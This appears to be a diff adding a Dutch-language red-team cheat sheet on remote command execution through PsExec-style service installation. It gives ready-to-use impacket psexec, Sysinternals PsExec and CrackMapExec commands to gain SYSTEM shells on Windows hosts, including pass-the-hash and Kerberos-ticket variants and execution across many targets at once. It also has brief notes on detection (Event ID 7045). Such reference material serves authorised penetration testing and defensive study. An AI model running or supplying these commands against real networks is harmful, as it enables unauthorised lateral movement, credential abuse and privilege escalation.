@@ -1,0 +1,33 @@
+# PsExec — Remote command execution via service installatie
+# Klassieke techniek — uploadt binary, maakt service, voert uit
+#
+# === Vereisten ===
+# - Local admin op doelwit
+# - SMB poort 445 open + ADMIN$ share toegankelijk
+#
+# === Voorbeelden ===
+
+# impacket psexec (SYSTEM shell)
+python3 psexec.py DOMAIN/USER:'PASS'@TARGET_IP
+
+# Met NTLM hash (Pass-the-Hash)
+python3 psexec.py DOMAIN/USER@TARGET_IP -hashes :NT_HASH
+
+# Met Kerberos ticket
+export KRB5CCNAME=admin.ccache
+python3 psexec.py -k -no-pass DOMAIN/USER@TARGET_FQDN
+
+# Specifiek commando
+python3 psexec.py DOMAIN/USER:'PASS'@TARGET_IP 'ipconfig /all'
+
+# Sysinternals PsExec (Windows)
+.\PsExec64.exe \\TARGET_IP -u DOMAIN\USER -p PASS cmd.exe
+.\PsExec64.exe \\TARGET_IP -u DOMAIN\USER -p PASS -s cmd.exe  # SYSTEM
+
+# CrackMapExec (meerdere hosts)
+crackmapexec smb targets.txt -u USER -p 'PASS' -d DOMAIN --exec-method psexec -x 'whoami'
+
+# Noot: Meest "luidruchtige" lateral movement methode
+# Noot: Event ID 7045 (service installed) in System log
+# Noot: Uploadt binary naar ADMIN$ share → maakt service → voert uit
+# Noot: -s flag geeft SYSTEM in plaats van admin context
